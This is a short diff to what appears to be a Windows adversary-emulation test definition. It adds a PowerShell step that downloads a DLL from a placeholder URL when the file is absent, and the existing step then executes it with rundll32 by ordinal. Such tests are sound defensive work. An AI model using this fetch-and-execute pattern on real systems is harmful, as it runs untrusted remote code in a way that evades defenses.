@@ -20,6 +20,12 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        DLL file must exist on disk at specified location
+      inline: |
+        if (Test-Path "#{input_file}") {exit 0} else {{Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
+        }}
+      executor: powershell
     - name: rundll32-with-ordinal-value
       inline: |
         rundll32.exe "{{.Args.input_file}}",#2
